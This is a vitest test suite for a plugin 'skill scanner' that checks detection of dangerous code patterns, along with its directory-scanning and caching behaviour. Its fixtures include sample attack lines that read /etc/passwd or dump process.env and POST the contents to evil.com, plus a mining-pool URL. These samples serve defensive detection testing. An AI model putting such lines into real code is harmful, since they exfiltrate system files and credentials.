import fsSync from "node:fs";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import {
  clearSkillScanCacheForTest,
  isScannable,
  scanDirectory,
  scanDirectoryWithSummary,
  scanSource,
} from "./skill-scanner.js";
import type { SkillScanOptions } from "./skill-scanner.js";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

const tmpDirs: string[] = [];

function makeTmpDir(): string {
  const dir = fsSync.mkdtempSync(path.join(os.tmpdir(), "skill-scanner-test-"));
  tmpDirs.push(dir);
  return dir;
}

function expectScanRule(
  source: string,
  expected: { ruleId: string; severity?: "warn" | "critical"; messageIncludes?: string },
) {
  const findings = scanSource(source, "plugin.ts");
  expect(
    findings.some(
      (finding) =>
        finding.ruleId === expected.ruleId &&
        (expected.severity == null || finding.severity === expected.severity) &&
        (expected.messageIncludes == null || finding.message.includes(expected.messageIncludes)),
    ),
  ).toBe(true);
}

function writeFixtureFiles(root: string, files: Record<string, string | undefined>) {
  for (const [relativePath, source] of Object.entries(files)) {
    if (source == null) {
      continue;
    }
    const filePath = path.join(root, relativePath);
    fsSync.mkdirSync(path.dirname(filePath), { recursive: true });
    fsSync.writeFileSync(filePath, source);
  }
}

function expectRulePresence(findings: { ruleId: string }[], ruleId: string, expected: boolean) {
  expect(findings.some((finding) => finding.ruleId === ruleId)).toBe(expected);
}

function normalizeSkillScanOptions(
  options?: Readonly<{
    maxFiles?: number;
    maxFileBytes?: number;
    includeFiles?: readonly string[];
  }>,
): SkillScanOptions | undefined {
  if (!options) {
    return undefined;
  }
  return {
    ...(options.maxFiles != null ? { maxFiles: options.maxFiles } : {}),
    ...(options.maxFileBytes != null ? { maxFileBytes: options.maxFileBytes } : {}),
    ...(options.includeFiles ? { includeFiles: [...options.includeFiles] } : {}),
  };
}

afterEach(async () => {
  for (const dir of tmpDirs) {
    await fs.rm(dir, { force: true, recursive: true }).catch(() => {});
  }
  tmpDirs.length = 0;
  clearSkillScanCacheForTest();
});

// ---------------------------------------------------------------------------
// ScanSource
// ---------------------------------------------------------------------------

describe("scanSource", () => {
  it.each([
    {
      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
      name: "detects child_process exec with string interpolation",
      source: `
import { exec } from "child_process";
const cmd = \`ls \${dir}\`;
exec(cmd);
`,
    },
    {
      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
      name: "detects child_process spawn usage",
      source: `
const cp = require("child_process");
cp.spawn("node", ["server.js"]);
`,
    },
    {
      expected: { ruleId: "dynamic-code-execution", severity: "critical" as const },
      name: "detects eval usage",
      source: `
const code = "1+1";
const result = eval(code);
`,
    },
    {
      expected: { ruleId: "dynamic-code-execution", severity: "critical" as const },
      name: "detects new Function constructor",
      source: `
const fn = new Function("a", "b", "return a + b");
`,
    },
    {
      expected: { ruleId: "potential-exfiltration", severity: "warn" as const },
      name: "detects fs.readFile combined with fetch POST (exfiltration)",
      source: `
import fs from "node:fs";
const data = fs.readFileSync("/etc/passwd", "utf-8");
fetch("https://evil.com/collect", { method: "post", body: data });
`,
    },
    {
      expected: { ruleId: "obfuscated-code", severity: "warn" as const },
      name: "detects hex-encoded strings (obfuscation)",
      source: `
const payload = "\\x72\\x65\\x71\\x75\\x69\\x72\\x65";
`,
    },
    {
      expected: { messageIncludes: "base64", ruleId: "obfuscated-code" },
      name: "detects base64 decode of large payloads (obfuscation)",
      source: `
const data = atob("${"A".repeat(250)}");
`,
    },
    {
      expected: { ruleId: "crypto-mining", severity: "critical" as const },
      name: "detects stratum protocol references (mining)",
      source: `
const pool = "stratum+tcp://pool.example.com:3333";
`,
    },
    {
      expected: { ruleId: "suspicious-network", severity: "warn" as const },
      name: "detects WebSocket to non-standard high port",
      source: `
const ws = new WebSocket("ws://remote.host:9999");
`,
    },
    {
      expected: { ruleId: "env-harvesting", severity: "critical" as const },
      name: "detects process.env access combined with network send (env harvesting)",
      source: `
const secrets = JSON.stringify(process.env);
fetch("https://evil.com/harvest", { method: "POST", body: secrets });
`,
    },
  ] as const)("$name", ({ source, expected }) => {
    expectScanRule(source, expected);
  });

  it("does not flag child_process import without exec/spawn call", () => {
    const source = `
// This module wraps child_process for safety
import type { ExecOptions } from "child_process";
const options: ExecOptions = { timeout: 5000 };
`;
    const findings = scanSource(source, "plugin.ts");
    expect(findings.some((f) => f.ruleId === "dangerous-exec")).toBe(false);
  });

  it("returns empty array for clean plugin code", () => {
    const source = `
export function greet(name: string): string {
  return \`Hello, \${name}!\`;
}
`;
    const findings = scanSource(source, "plugin.ts");
    expect(findings).toEqual([]);
  });

  it("returns empty array for normal http client code (just a fetch GET)", () => {
    const source = `
const response = await fetch("https://api.example.com/data");
const json = await response.json();
console.log(json);
`;
    const findings = scanSource(source, "plugin.ts");
    expect(findings).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// IsScannable
// ---------------------------------------------------------------------------

describe("isScannable", () => {
  it.each([
    ["file.js", true],
    ["file.ts", true],
    ["file.mjs", true],
    ["file.cjs", true],
    ["file.tsx", true],
    ["file.jsx", true],
    ["readme.md", false],
    ["package.json", false],
    ["logo.png", false],
    ["style.css", false],
  ] as const)("classifies %s", (fileName, expected) => {
    expect(isScannable(fileName)).toBe(expected);
  });
});

// ---------------------------------------------------------------------------
// ScanDirectory
// ---------------------------------------------------------------------------

describe("scanDirectory", () => {
  it.each([
    {
      expectedMinFindings: 1,
      expectedPresent: true,
      expectedRuleId: "dynamic-code-execution",
      files: {
        "index.js": `const x = eval("1+1");`,
        "lib/helper.js": `export const y = 42;`,
      },
      name: "scans .js files in a directory tree",
    },
    {
      expectedPresent: false,
      expectedRuleId: "dynamic-code-execution",
      files: {
        "clean.js": `export const x = 1;`,
        "node_modules/evil-pkg/index.js": `const x = eval("hack");`,
      },
      name: "skips node_modules directories",
    },
    {
      expectedPresent: false,
      expectedRuleId: "dynamic-code-execution",
      files: {
        ".hidden/secret.js": `const x = eval("hack");`,
        "clean.js": `export const x = 1;`,
      },
      name: "skips hidden directories",
    },
    {
      expectedPresent: true,
      expectedRuleId: "dynamic-code-execution",
      files: {
        ".hidden/entry.js": `const x = eval("hack");`,
      },
      includeFiles: [".hidden/entry.js"],
      name: "scans hidden entry files when explicitly included",
    },
  ] as const)(
    "$name",
    async ({ files, includeFiles, expectedRuleId, expectedPresent, expectedMinFindings }) => {
      const root = makeTmpDir();
      writeFixtureFiles(root, files);
      const findings = await scanDirectory(
        root,
        includeFiles ? { includeFiles: [...includeFiles] } : undefined,
      );
      if (expectedMinFindings != null) {
        expect(findings.length).toBeGreaterThanOrEqual(expectedMinFindings);
      }
      expectRulePresence(findings, expectedRuleId, expectedPresent);
    },
  );
});

// ---------------------------------------------------------------------------
// ScanDirectoryWithSummary
// ---------------------------------------------------------------------------

describe("scanDirectoryWithSummary", () => {
  it.each([
    {
      expected: {
        critical: 2,
        findingCount: 2,
        info: 0,
        scannedFiles: 3,
        warn: 0,
      },
      files: {
        "a.js": `const x = eval("code");`,
        "src/b.ts": `const pool = "stratum+tcp://pool:3333";`,
        "src/c.ts": `export const clean = true;`,
      },
      name: "returns correct counts",
    },
    {
      expected: {
        maxFindings: 2,
        scannedFiles: 2,
      },
      files: {
        "a.js": `const x = eval("a");`,
        "b.js": `const x = eval("b");`,
        "c.js": `const x = eval("c");`,
      },
      name: "caps scanned file count with maxFiles",
      options: { maxFiles: 2 },
    },
    {
      expected: {
        findingCount: 0,
        scannedFiles: 0,
      },
      files: {
        "large.js": `eval("${"A".repeat(4096)}");`,
      },
      name: "skips files above maxFileBytes",
      options: { maxFileBytes: 64 },
    },
    {
      expected: {
        findingCount: 0,
        scannedFiles: 1,
      },
      files: {
        "clean.js": `export const ok = true;`,
      },
      name: "ignores missing included files",
      options: { includeFiles: ["missing.js"] },
    },
    {
      expected: {
        expectedPresent: true,
        expectedRuleId: "dynamic-code-execution",
        scannedFiles: 1,
      },
      files: {
        ".hidden/entry.js": `const x = eval("hack");`,
        "regular.js": `export const ok = true;`,
      },
      name: "prioritizes included entry files when maxFiles is reached",
      options: {
        includeFiles: [".hidden/entry.js"],
        maxFiles: 1,
      },
    },
  ] as const)("$name", async ({ files, options, expected }) => {
    const root = makeTmpDir();
    writeFixtureFiles(root, files);
    const summary = await scanDirectoryWithSummary(root, normalizeSkillScanOptions(options));
    expect(summary.scannedFiles).toBe(expected.scannedFiles);
    if (expected.critical != null) {
      expect(summary.critical).toBe(expected.critical);
    }
    if (expected.warn != null) {
      expect(summary.warn).toBe(expected.warn);
    }
    if (expected.info != null) {
      expect(summary.info).toBe(expected.info);
    }
    if (expected.findingCount != null) {
      expect(summary.findings).toHaveLength(expected.findingCount);
    }
    if (expected.maxFindings != null) {
      expect(summary.findings.length).toBeLessThanOrEqual(expected.maxFindings);
    }
    if (expected.expectedRuleId != null && expected.expectedPresent != null) {
      expectRulePresence(summary.findings, expected.expectedRuleId, expected.expectedPresent);
    }
  });

  it("throws when reading a scannable file fails", async () => {
    const root = makeTmpDir();
    const filePath = path.join(root, "bad.js");
    fsSync.writeFileSync(filePath, "export const ok = true;\n");

    const realReadFile = fs.readFile;
    const spy = vi.spyOn(fs, "readFile").mockImplementation(async (...args) => {
      const pathArg = args[0];
      if (typeof pathArg === "string" && pathArg === filePath) {
        const err = new Error("EACCES: permission denied") as NodeJS.ErrnoException;
        err.code = "EACCES";
        throw err;
      }
      return await realReadFile(...args);
    });

    try {
      await expect(scanDirectoryWithSummary(root)).rejects.toMatchObject({ code: "EACCES" });
    } finally {
      spy.mockRestore();
    }
  });

  it("reuses cached findings for unchanged files and invalidates on file updates", async () => {
    const root = makeTmpDir();
    const filePath = path.join(root, "cached.js");
    fsSync.writeFileSync(filePath, `const x = eval("1+1");`);

    const readSpy = vi.spyOn(fs, "readFile");
    const first = await scanDirectoryWithSummary(root);
    const second = await scanDirectoryWithSummary(root);

    expect(first.critical).toBeGreaterThan(0);
    expect(second.critical).toBe(first.critical);
    expect(readSpy).toHaveBeenCalledTimes(1);

    await fs.writeFile(filePath, `const x = eval("2+2");\n// cache bust`, "utf8");
    const third = await scanDirectoryWithSummary(root);

    expect(third.critical).toBeGreaterThan(0);
    expect(readSpy).toHaveBeenCalledTimes(2);
    readSpy.mockRestore();
  });

  it("reuses cached directory listings for unchanged trees", async () => {
    const root = makeTmpDir();
    fsSync.writeFileSync(path.join(root, "cached.js"), `export const ok = true;`);

    const readdirSpy = vi.spyOn(fs, "readdir");
    await scanDirectoryWithSummary(root);
    await scanDirectoryWithSummary(root);

    expect(readdirSpy).toHaveBeenCalledTimes(1);
    readdirSpy.mockRestore();
  });
});
